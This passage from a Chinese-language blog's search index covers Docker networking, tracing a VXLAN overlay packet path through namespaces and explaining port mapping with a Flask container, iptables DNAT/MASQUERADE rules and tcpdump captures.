<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">389: eth0@if390: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:0a:00:01:64 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.0.1.100/24 brd 10.0.1.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">391: eth1@if392: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 5e:70:90:ab:28:6c brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line"># route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         172.18.0.1      0.0.0.0         UG    0      0        0 eth1</span><br><span class="line">10.0.1.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0</span><br><span class="line">172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth1</span><br></pre></td></tr></table></figure>
<p>容器中ping 10.0.1.103, 查路由表, 数据包从eth0发出, 接下来查询veth pair另一端</p>
<p>在宿主机<code>/var/run/docker/netns/</code>下找到容器eth0另一端的veth所在的网络命名空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nsenter --net=/var/run/docker/netns/1-tic6vjs8d3 ip link show</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: br0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default</span><br><span class="line">    link/ether 06:12:52:c7:42:88 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">386: vxlan0@if386: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master br0 state UNKNOWN mode DEFAULT group default</span><br><span class="line">    link/ether 06:12:52:c7:42:88 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">388: veth0@if387: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master br0 state UP mode DEFAULT group default</span><br><span class="line">    link/ether 1e:09:a3:80:62:d9 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">390: veth1@if389: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master br0 state UP mode DEFAULT group default</span><br><span class="line">    link/ether 9a:7c:73:4e:a6:32 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br></pre></td></tr></table></figure>

<p>使用nsenter进入这个namespace, 查看网卡和路由表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nsenter --net=/var/run/docker/netns/1-tic6vjs8d3 bash</span><br><span class="line"># ifconfig</span><br><span class="line">br0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450</span><br><span class="line">        inet 10.0.1.1  netmask 255.255.255.0  broadcast 10.0.1.255</span><br><span class="line">        ether 06:12:52:c7:42:88  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 16  bytes 448 (448.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2  bytes 108 (108.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">veth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450</span><br><span class="line">        ether 1e:09:a3:80:62:d9  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 64  bytes 5656 (5.5 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 74  bytes 6188 (6.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">veth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450</span><br><span class="line">        ether 9a:7c:73:4e:a6:32  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 273  bytes 25298 (24.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 266  bytes 25004 (24.4 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">vxlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450</span><br><span class="line">        ether 06:12:52:c7:42:88  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 194  bytes 16296 (15.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 194  bytes 16296 (15.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"># route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">10.0.1.0        0.0.0.0         255.255.255.0   U     0      0        0 br0</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的veth1和容器的eth0是一对veth pair, veth1收到ICMP报文, 查路由表, 把数据包转发给br0网桥</li>
<li>br0网桥根据MAC地址表, 把数据包转发给vxlan0</li>
<li>vxlan0将原始以太网帧封装进一个UDP报文(端口号4789), 把目的IP替换变成主机B的IP, 源IP变成主机A的IP, 将封装后数据包发送到宿主机的物理网卡ens160</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">容器network namespace |  vxlan0所在的network namespace  |  宿主机A的network namespace  </span><br><span class="line">容器eth0      -&gt;         veth1 -&gt;  br0  -&gt;  vxlan0 -&gt;     ens160</span><br></pre></td></tr></table></figure>

<h1><span id="参考">参考</span></h1><p>【1】 <a href="https://cloud.tencent.com/developer/article/2363140">Docker跨主机Overlay网络动手实验</a><br>【2】 <a href="https://blog.csdn.net/u022812849/article/details/134898675">vxlan的原理与实验</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 端口映射原理</title>
    <url>/2025/0330125855.html</url>
    <content><![CDATA[<p>在 Docker 中，默认情况下容器无法直接与外部网络通信。 为了使外部网络能够访问容器内的服务，Docker 提供了端口映射功能，通过将宿主机的端口映射到容器内的端口，外部可以通过宿主机的IP和端口访问容器内的服务</p>
<p>以下通过动手演示, 安装一个Flask容器, 解释端口映射从外部访问容器的原理</p>
<h1><span id="安装一个flask容器">安装一个Flask容器</span></h1><h2><span id="文件结构">文件结构</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── app.py</span><br></pre></td></tr></table></figure>

<p>Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM rockylinux:9.3</span><br><span class="line"></span><br><span class="line">RUN dnf update -y &amp;&amp; \</span><br><span class="line">    dnf install -y python3 python3-pip &amp;&amp; \</span><br><span class="line">    dnf clean all</span><br><span class="line"></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line">COPY app.py /app/app.py</span><br><span class="line"></span><br><span class="line">RUN pip3 install --no-cache-dir flask</span><br><span class="line"></span><br><span class="line">EXPOSE 5000</span><br><span class="line"></span><br><span class="line">CMD [&quot;python3&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure>

<p>app.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t flask-app:1.0 .</span><br></pre></td></tr></table></figure>
<p>启动容器, 进行端口映射</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:5000 flask-app:1.0</span><br></pre></td></tr></table></figure>

<p>从外部访问 (192.168.52.203是我的虚拟机IP)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl 192.168.52.203</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1><span id="端口映射原理">端口映射原理</span></h1><p>当执行<code>docker run -d -p 80:5000 flask-app:1.0</code>时, Docker会配置iptables规则来实现端口映射, 流程如下:</p>
<h2><span id="1-iptables-prerouting-链处理-做dnat转换">1. iptables PREROUTING 链处理, 做DNAT转换</span></h2><p>外部请求到达宿主机时, iptables的PREROUTING链处理该请求, 根据DNAT规则将目标IP和端口(192.168.52.203:5000)替换为容器的IP和端口(172.17.0.2:5000)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># iptables -t nat -L PREROUTING</span><br><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">DOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL</span><br><span class="line"></span><br><span class="line"># iptables -t nat -L DOCKER</span><br><span class="line">Chain DOCKER (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">RETURN     all  --  anywhere             anywhere</span><br><span class="line">RETURN     all  --  anywhere             anywhere</span><br><span class="line">DNAT       tcp  --  anywhere             anywhere             tcp dpt:http to:172.17.0.2:5000</span><br></pre></td></tr></table></figure>

<h2><span id="2-dnat转换后的数据包转发到容器">2. DNAT转换后的数据包转发到容器</span></h2><p>经过DNAT转换后的数据包会发送到虚拟网桥docker0, 再通过veth设备转发到容器的虚拟网络接口(eth0) </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">宿主机的路由表</span><br><span class="line"># route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         192.168.52.2    0.0.0.0         UG    100    0        0 ens160</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 ens160</span><br></pre></td></tr></table></figure>

<h2><span id="3-容器接受请求并返回响应-响应报文通过iptables-postrouting链处理-做snat转换">3. 容器接受请求并返回响应, 响应报文通过iptables POSTROUTING链处理, 做SNAT转换</span></h2><p>容器接受请求并返回响应，响应报文先发送到 docker0, 再通过 SNAT（MASQUERADE）规则，将源IP和端口(172.17.0.2:5000)替换为宿主机的IP和端口，最后发送回客户端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># iptables -t nat -L POSTROUTING -v</span><br><span class="line">Chain POSTROUTING (policy ACCEPT 2387 packets, 151K bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line">   89  5558 MASQUERADE  all  --  any    !docker0  172.17.0.0/16        anywhere</span><br></pre></td></tr></table></figure>

<h2><span id="附-wireshark抓包结果">附: wireshark抓包结果</span></h2><ul>
<li>客户端IP: 192.168.52.202</li>
<li>运行容器的宿主机IP: 192.168.52.203</li>
<li>容器IP: 172.17.0.2</li>
</ul>
<p>抓宿主机网卡的包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i ens160 -nn tcp and not port 22 -w ens160.pcap</span><br></pre></td></tr></table></figure>

<p><img data-src="/2025/0330125855/image1.png"></p>
<p>抓docker0的包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i docker0 -nn tcp -w docker0.pcap</span><br></pre></td></tr></table></figure>

<p><img data-src="/2025/0330125855/image2.png"></p>
<h1><span id="参考">参考</span></h1><p><a href="https://www.cnblogs.com/heian99/p/12585722.html">Docker容器访问外部世界 </a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
</search>
